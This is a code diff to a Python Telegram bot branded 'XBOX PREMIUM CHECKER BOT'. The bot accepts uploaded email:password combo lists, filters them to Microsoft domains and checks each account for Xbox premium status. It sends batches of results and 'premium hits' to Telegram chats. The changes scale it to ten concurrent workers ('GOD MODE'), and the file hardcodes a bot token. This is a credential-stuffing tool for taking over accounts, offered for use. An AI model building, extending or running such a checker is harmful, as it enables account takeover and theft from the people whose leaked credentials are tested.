@@ -410,12 +410,12 @@ class ResultManager:
 # ============================================================
 
 # ============================================================
-# SIMPLE RELIABLE QUEUE SYSTEM
+# GOD-LIKE MULTI-WORKER QUEUE SYSTEM
 # ============================================================
 
 BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
 CHAT_ID = 8260250818
-MAX_WORKERS = 3  # Balanced for Railway
+MAX_WORKERS = 10  # GOD MODE: 10 concurrent workers
 
 ALLOWED_DOMAINS = [
     'hotmail.com', 'outlook.com', 'live.com', 'msn.com'
@@ -425,7 +425,8 @@ task_queue = queue.Queue()
 active_count = 0
 active_lock = threading.Lock()
 bot_app = None
-event_loop = None
+worker_threads = []
+processing = True
 
 class Task:
     def __init__(self, file_path, file_name, file_id, chat_id):
@@ -448,7 +449,7 @@ def filter_file(file_path):
             lines = f.readlines()
         
         valid = []
-        invalid = []
+        invalid_emails = []
         for line in lines:
             line = line.strip()
             if not line or ':' not in line:
@@ -457,18 +458,18 @@ def filter_file(file_path):
             if validate_domain(email):
                 valid.append(line)
             else:
-                if len(invalid) < 5:
-                    invalid.append(email)
+                if len(invalid_emails) < 5:
+                    invalid_emails.append(email)
         
         if not valid:
-            return None, 0, len([l for l in lines if l.strip() and ':' in l]) - len(valid), invalid
+            return None, 0, len([l for l in lines if l.strip() and ':' in l]) - len(valid), invalid_emails
         
         temp_dir = tempfile.mkdtemp()
         filtered = os.path.join(temp_dir, 'filtered_' + os.path.basename(file_path))
         with open(filtered, 'w', encoding='utf-8') as f:
             f.write('\n'.join(valid))
         
-        return filtered, len(valid), len([l for l in lines if l.strip() and ':' in l]) - len(valid), invalid
+        return filtered, len(valid), len([l for l in lines if l.strip() and ':' in l]) - len(valid), invalid_emails
     except:
         return None, 0, 0, []
 
@@ -481,17 +482,19 @@ def process_file(task):
         if not lines:
             asyncio.run_coroutine_threadsafe(
                 bot_app.bot.send_message(chat_id=CHAT_ID, text=f"❌ No valid accounts in {task.file_name}"),
-                event_loop
+                asyncio.get_event_loop()
             )
             return
         
-        stats = {'total': len(lines), 'checked': 0, 'premium': 0, 'free': 0, 'bad': 0, 'expired': 0, 'banned': 0, 'two_factor': 0, 'timeout': 0, 'error': 0}
+        stats = {'total': len(lines), 'checked': 0, 'premium': 0, 'free': 0, 'bad': 0, 
+                 'expired': 0, 'banned': 0, 'two_factor': 0, 'timeout': 0, 'error': 0}
         checker = XboxChecker()
         batch = []
+        BATCH_SIZE = 10
         
         asyncio.run_coroutine_threadsafe(
-            bot_app.bot.send_message(chat_id=CHAT_ID, text=f"🚀 **Started:** {task.file_name}\n📊 Total: {stats['total']} accounts", parse_mode='Markdown'),
-            event_loop
+            bot_app.bot.send_message(chat_id=CHAT_ID, text=f"🚀 **Started:** {task.file_name}\n📊 Total: {stats['total']} accounts\n⚡ Workers: {MAX_WORKERS}", parse_mode='Markdown'),
+            asyncio.get_event_loop()
         )
         
         for idx, line in enumerate(lines, 1):
@@ -542,11 +545,11 @@ def process_file(task):
                 
                 stats['checked'] += 1
                 
-                if len(batch) >= 10:
+                if len(batch) >= BATCH_SIZE:
                     progress = f"📊 **Progress:** {stats['checked']}/{stats['total']}\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch) + "\n```"
                     asyncio.run_coroutine_threadsafe(
                         bot_app.bot.send_message(chat_id=CHAT_ID, text=progress, parse_mode='Markdown'),
-                        event_loop
+                        asyncio.get_event_loop()
                     )
                     batch = []
                 
@@ -560,19 +563,19 @@ def process_file(task):
             final_batch = f"📊 **Final Batch:**\n\n```\n" + "\n".join(batch) + "\n```"
             asyncio.run_coroutine_threadsafe(
                 bot_app.bot.send_message(chat_id=CHAT_ID, text=final_batch, parse_mode='Markdown'),
-                event_loop
+                asyncio.get_event_loop()
             )
         
         summary = f"✅ **SCAN COMPLETE**\n\n📄 `{task.file_name}`\n━━━━━━━━━━━━━━━━━━━━\n🔢 Total: {stats['total']}\n✅ PREMIUM: {stats['premium']}\n🆓 FREE: {stats['free']}\n❌ BAD: {stats['bad']}\n━━━━━━━━━━━━━━━━━━━━"
         asyncio.run_coroutine_threadsafe(
             bot_app.bot.send_message(chat_id=CHAT_ID, text=summary, parse_mode='Markdown'),
-            event_loop
+            asyncio.get_event_loop()
         )
         
     except Exception as e:
         asyncio.run_coroutine_threadsafe(
             bot_app.bot.send_message(chat_id=CHAT_ID, text=f"❌ Error: {str(e)[:200]}"),
-            event_loop
+            asyncio.get_event_loop()
         )
     finally:
         with active_lock:
@@ -583,18 +586,18 @@ def process_file(task):
             except:
                 pass
 
-def worker():
-    while True:
+def worker_loop():
+    while processing:
         try:
             with active_lock:
                 if active_count >= MAX_WORKERS:
-                    time.sleep(1)
+                    time.sleep(0.5)
                     continue
             
             try:
                 task = task_queue.get(timeout=1)
             except queue.Empty:
-                time.sleep(1)
+                time.sleep(0.5)
                 continue
             
             with active_lock:
@@ -609,99 +612,116 @@ def worker():
             time.sleep(1)
 
 # ============================================================
-# TELEGRAM HANDLERS
+# TELEGRAM HANDLERS - ORIGINAL STYLE
 # ============================================================
 
-async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        f"🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
-        f"⚡ Workers: {MAX_WORKERS}\n\n"
-        f"Send a `.txt` file with `email:password` format\n\n"
-        f"**Commands:**\n/start - Help\n/status - Queue status",
-        parse_mode='Markdown'
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = (
+        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
+        f"⚡ **Concurrent Workers:** {MAX_WORKERS} files at once\n\n"
+        "Send a `.txt` file with `email:password` format\n\n"
+        "**Allowed domains:**\n"
+        "hotmail.com, outlook.com, live.com, msn.com\n\n"
+        "**Commands:**\n"
+        "/start - This message\n"
+        "/status - Queue status\n\n"
+        "📊 Results appear in batches (10 accounts per update)\n"
+        "🎯 Premium hits sent to BOTH Telegram bots instantly!\n"
+        "⚡ Multiple files process simultaneously!"
     )
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
-async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with active_lock:
         active = active_count
         pending = task_queue.qsize()
     
-    await update.message.reply_text(
-        f"📊 **Status**\n\n"
-        f"⚡ Active: {active}/{MAX_WORKERS}\n"
-        f"⏳ Queue: {pending}",
-        parse_mode='Markdown'
-    )
+    msg = f"📊 **QUEUE STATUS**\n\n"
+    msg += f"⚡ **Active Workers:** {active}/{MAX_WORKERS}\n"
+    msg += f"⏳ **Queue Size:** {pending} file(s)\n"
+    msg += f"🔄 **Processing:** {'Yes' if active > 0 else 'No'}\n\n"
+    msg += f"Send .txt files to add to queue."
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Send a `.txt` file")
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    document = update.message.document
+    
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please send a `.txt` file.")
         return
     
-    file = await context.bot.get_file(doc.file_id)
+    file = await context.bot.get_file(document.file_id)
     temp_dir = tempfile.mkdtemp()
-    temp_path = os.path.join(temp_dir, doc.file_name)
+    temp_path = os.path.join(temp_dir, document.file_name)
     await file.download_to_drive(temp_path)
     
-    filtered, valid, invalid, examples = filter_file(temp_path)
+    filtered_path, valid_count, invalid_count, invalid_examples = filter_file(temp_path)
     
-    if not filtered:
-        msg = f"❌ **REJECTED**\n\n📄 {doc.file_name}\nNo valid Microsoft accounts"
-        if examples:
-            msg += f"\n\nExamples: {', '.join(examples[:3])}"
+    if filtered_path is None or valid_count == 0:
+        msg = f"❌ **FILE REJECTED**\n\n📄 `{document.file_name}`\n🔢 Valid Microsoft accounts: {valid_count}\n⚠️ Skipped: {invalid_count} non-Microsoft account(s)"
+        if invalid_examples:
+            msg += f"\n\n**Examples rejected:**\n" + "\n".join([f"• {e}" for e in invalid_examples[:3]])
         await update.message.reply_text(msg, parse_mode='Markdown')
         shutil.rmtree(temp_dir)
         return
     
-    task = Task(filtered, doc.file_name, doc.file_id, update.effective_chat.id)
+    task = Task(file_path=filtered_path, file_name=document.file_name, file_id=document.file_id, chat_id=update.effective_chat.id)
     task_queue.put(task)
     
     with active_lock:
-        pending = task_queue.qsize()
-        active = active_count
+        queue_size = task_queue.qsize()
+        active_count_show = active_count
     
     await update.message.reply_text(
         f"✅ **File Accepted**\n\n"
-        f"📄 `{doc.file_name}`\n"
-        f"🔢 Valid: {valid} accounts\n"
-        f"⚡ Active: {active}/{MAX_WORKERS}\n"
-        f"📊 Queue: {pending}\n\n"
-        f"🔄 Processing...",
+        f"📄 `{document.file_name}`\n"
+        f"🔢 Valid: `{valid_count}` accounts\n"
+        f"⚡ Active Workers: {active_count_show}/{MAX_WORKERS}\n"
+        f"📊 Queue Position: {queue_size}\n\n"
+        f"🔄 Will start processing when a worker is free...\n"
+        f"🤖 Premium hits sent to BOTH Telegram bots!",
         parse_mode='Markdown'
     )
     
-    if invalid > 0:
-        await update.message.reply_text(f"⚠️ Skipped {invalid} non-Microsoft accounts", parse_mode='Markdown')
+    if invalid_count > 0:
+        await update.message.reply_text(f"⚠️ Skipped `{invalid_count}` non-Microsoft account(s)", parse_mode='Markdown')
 
 # ============================================================
-# MAIN
+# MAIN - GOD MODE
 # ============================================================
 
-def run_bot():
-    global bot_app, event_loop
+def main():
+    global bot_app, processing
     
-    event_loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(event_loop)
-    
+    # Create bot application
     bot_app = Application.builder().token(BOT_TOKEN).build()
-    bot_app.add_handler(CommandHandler("start", start_cmd))
-    bot_app.add_handler(CommandHandler("status", status_cmd))
-    bot_app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     
-    # Start worker threads
-    for _ in range(MAX_WORKERS):
-        t = Thread(target=worker, daemon=True)
-        t.start()
+    # Add handlers
+    bot_app.add_handler(CommandHandler("start", start_command))
+    bot_app.add_handler(CommandHandler("status", status_command))
+    bot_app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    # Start worker threads (GOD MODE: 10 workers)
+    processing = True
+    for i in range(MAX_WORKERS):
+        worker = threading.Thread(target=worker_loop, daemon=True)
+        worker.start()
+        worker_threads.append(worker)
     
     print("=" * 60)
-    print("🎮 XBOX PREMIUM CHECKER BOT")
+    print("🎮 XBOX PREMIUM CHECKER BOT - GOD MODE")
     print("=" * 60)
-    print(f"✅ Bot started!")
-    print(f"⚡ Workers: {MAX_WORKERS}")
+    print(f"✅ Main Bot: {TELEGRAM_BOT_TOKEN_MAIN[:15]}...")
+    print(f"✅ Premium Bot: {TELEGRAM_BOT_TOKEN_PREMIUM[:15]}...")
+    print(f"⚡ GOD MODE: {MAX_WORKERS} CONCURRENT WORKERS")
+    print(f"✅ Premium hits sent to BOTH Telegram bots!")
+    print("📦 Results in batches of 10 accounts")
+    print("=" * 60)
+    print("🚀 Bot is READY! Send .txt files to start checking...")
     print("=" * 60)
     
+    # Start bot (this blocks)
     bot_app.run_polling()
 
 if __name__ == "__main__":
-    run_bot()
+    main()
